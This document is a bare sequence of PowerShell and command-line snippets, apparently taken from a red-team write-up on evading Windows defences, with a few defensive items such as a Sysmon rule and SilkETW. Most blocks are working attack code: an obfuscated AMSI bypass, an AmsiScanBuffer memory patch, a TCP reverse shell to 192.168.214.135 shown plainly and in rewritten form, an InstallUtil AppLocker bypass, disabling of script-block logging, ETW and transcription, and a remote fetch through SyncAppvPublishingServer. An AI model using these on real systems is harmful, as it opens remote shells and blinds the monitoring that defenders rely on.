["```\nGet-WmiObject Win32_OperatingSystem | Select PSComputerName, Caption, Version | fl\nPSComputerName : CASTELROCK\nCaption        : Microsoft Windows Server 2019 Datacenter Evaluation\nVersion        : 10.0.17763\n```", "```\n$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')\n$field.SetValue($null,$true)\n```", "```\n$client = New-Object System.Net.Sockets.TCPClient('192.168.214.135',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```", "```\nSet-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.214.135',443));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```", "```\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)\n$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))\n$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)\n$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)\n#0:  31 c0                   xor    eax,eax\n#2:  05 78 01 19 7f          add    eax,0x7f190178\n#7:  05 df fe ed 00          add    eax,0xedfedf\n#c:  c3                      ret\n#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)\n```", "```\nGet-AppLockerPolicy -Effective | Select-Object RuleCollections -ExpandProperty RuleCollections\n```", "```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U \"C:\\Windows\\Tasks\\my.exe\"\n```", "```\n$CurrTemp = $env:temp\n$CurrTmp = $env:tmp\n$TEMPBypassPath = \"C:\\windows\\temp\"\n$TMPBypassPath = \"C:\\windows\\temp\"\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value \"$TEMPBypassPath\"\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value \"$TMPBypassPath\"\nInvoke-WmiMethod -Class win32_process -Name create -ArgumentList \"Powershell.exe\"\nsleep 5\n#Set it back\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value $CurrTmp\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value $CurrTemp\n```", "```\nSysmon64.exe -accepteula -i sysmonconfig-export.xml\n```", "```\n$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').\"GetF`ie`ld\"('cachedGro'+'upPolicySettings', 'N'+'onPu'+'blic,Static')\nIf ($GroupPolicyField) {\n  $GroupPolicyCache = $GroupPolicyField.GetValue($null)\n  Write-Host(\"Before\")\n  $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] | fl\n  If ($GroupPolicyCache['ScriptB'+'lockLogging']) {\n    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0\n    $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0\n  }\n  $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()\n  $val.Add('EnableScriptB'+'lockLogging', 0)\n  $val.Add('EnableScriptB'+'lockInvocationLogging', 0)\n  $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] = $val\n  Write-Host(\"After\")\n  $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] | fl\n}\n```", "```\n[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\n```", "```\nSet-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription -Name  EnableTranscripting -Value 0\n```", "```\n<TargetObject name=\"PowerShell Logging Changes\" condition=\"begin with\">HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\</TargetObject>\n```", "```\nSyncAppvPublishingServer.vbs \"br; iwr http://192.168.13.152:443/a\"\n```", "```\n .\\SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -l verbose -ot eventlog\n```", "```\n.\\legit_binary.exe OSInfo\n```"]